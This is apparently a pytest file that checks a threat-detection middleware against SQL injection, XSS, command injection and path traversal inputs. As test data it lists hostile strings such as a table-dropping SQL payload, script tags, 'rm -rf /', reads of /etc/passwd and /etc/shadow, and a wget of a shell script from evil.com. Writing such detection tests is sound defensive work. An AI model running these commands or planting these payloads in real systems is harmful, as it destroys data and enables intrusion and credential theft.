"""
Tests for input threat detection (command injection, SQL injection, XSS, path traversal).
Validates the middleware protection layer.
"""
import os
import sys
import pytest

os.environ.setdefault("DATABASE_URL", "sqlite:///./test.db")
os.environ.setdefault("SECRET_KEY", "ci-test-secret-key-minimum-32-characters-long")

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from core.advanced_security import ThreatDetector


@pytest.fixture
def detector():
    return ThreatDetector()


class TestSQLInjection:
    def test_detects_union_select(self, detector):
        assert detector.detect_sql_injection("UNION SELECT * FROM users")

    def test_detects_drop_table(self, detector):
        assert detector.detect_sql_injection("'; DROP TABLE users; --")

    def test_detects_or_1_equals_1(self, detector):
        assert detector.detect_sql_injection("' OR 1=1 --")

    def test_allows_normal_text(self, detector):
        assert not detector.detect_sql_injection("What is the normal blood pressure range?")

    def test_allows_clinical_text(self, detector):
        assert not detector.detect_sql_injection("Patient presented with chest pain and shortness of breath")


class TestXSS:
    def test_detects_script_tag(self, detector):
        assert detector.detect_xss("<script>alert('xss')</script>")

    def test_detects_javascript_protocol(self, detector):
        assert detector.detect_xss("javascript:alert(1)")

    def test_detects_onload(self, detector):
        assert detector.detect_xss('<img onload="alert(1)">')

    def test_detects_iframe(self, detector):
        assert detector.detect_xss('<iframe src="evil.com"></iframe>')

    def test_allows_normal_html_entities(self, detector):
        assert not detector.detect_xss("Temperature is 38.5 degrees")


class TestCommandInjection:
    def test_detects_rm(self, detector):
        assert detector.detect_command_injection("; rm -rf /")

    def test_detects_backticks(self, detector):
        assert detector.detect_command_injection("`whoami`")

    def test_detects_dollar_paren(self, detector):
        assert detector.detect_command_injection("$(cat /etc/passwd)")

    def test_detects_pipe(self, detector):
        assert detector.detect_command_injection("| cat /etc/shadow")

    def test_detects_double_ampersand(self, detector):
        assert detector.detect_command_injection("&& wget evil.com/shell.sh")

    def test_allows_normal_text(self, detector):
        assert not detector.detect_command_injection("normal command")


class TestPathTraversal:
    def test_detects_dot_dot_slash(self, detector):
        assert detector.detect_path_traversal("../../etc/passwd")

    def test_detects_encoded_traversal(self, detector):
        assert detector.detect_path_traversal("..%2f..%2fetc/passwd")

    def test_detects_backslash_traversal(self, detector):
        assert detector.detect_path_traversal("..\\..\\windows\\system32")

    def test_allows_normal_path(self, detector):
        assert not detector.detect_path_traversal("normal/path/file.txt")


class TestRiskScore:
    def test_clean_request_lower_than_injection(self, detector):
        from unittest.mock import MagicMock
        request = MagicMock()
        request.client.host = "192.168.1.1"
        request.headers.get.return_value = "Mozilla/5.0"
        clean_score = detector.calculate_risk_score(request, "normal input text")
        injection_score = detector.calculate_risk_score(request, "'; DROP TABLE users; --")
        assert injection_score > clean_score

    def test_injection_input_high_score(self, detector):
        from unittest.mock import MagicMock
        request = MagicMock()
        request.client.host = "192.168.1.1"
        request.headers.get.return_value = "Mozilla/5.0"
        score = detector.calculate_risk_score(request, "'; DROP TABLE users; --")
        assert score >= 50
